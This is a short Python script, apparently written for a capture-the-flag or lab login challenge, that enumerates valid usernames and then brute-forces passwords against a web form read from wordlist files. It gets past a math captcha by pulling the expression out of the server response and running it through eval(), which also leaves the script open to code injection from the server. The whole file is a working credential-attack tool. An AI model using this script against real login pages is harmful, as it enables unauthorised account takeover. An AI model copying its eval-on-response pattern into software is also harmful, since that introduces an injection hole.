import requests
import re

url = "" # Enter URL here!

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

regex = "\d+.\W.\d+"

userfilename = open('usernames.txt', 'r')

usernameline = userfilename.readlines()

passfilename = open('passwords.txt', 'r')

passwordline = passfilename.readlines()

for username in usernameline:
    username = username.rstrip()

    data = f"username={username}&password=daz1"

    p = requests.post(url, data=data, headers=headers)

    if "Invalid captcha" in p.text:

        captcha = re.findall(regex,p.text)

        for returnedcaptcha in captcha:
            completedcaptcha = eval(returnedcaptcha)

            data = f"username={username}&password=daz1&captcha={completedcaptcha}"
            p = requests.post(url, data=data, headers=headers)

            if "does not exist" not in p.text:
                #print("The username is: " + username)
                for passwords in passwordline:
                    password = passwords.rstrip()

                    captcha = re.findall(regex,p.text)
                    for returnedcaptcha in captcha:
                        completedcaptcha = eval(returnedcaptcha)
                        #print(completedcaptcha)

                        data = f"username={username}&password={password}&captcha={completedcaptcha}"

                        p = requests.post(url, data=data, headers=headers)

                        if "Invalid password for user" not in p.text:
                            print("The password is: " + password)

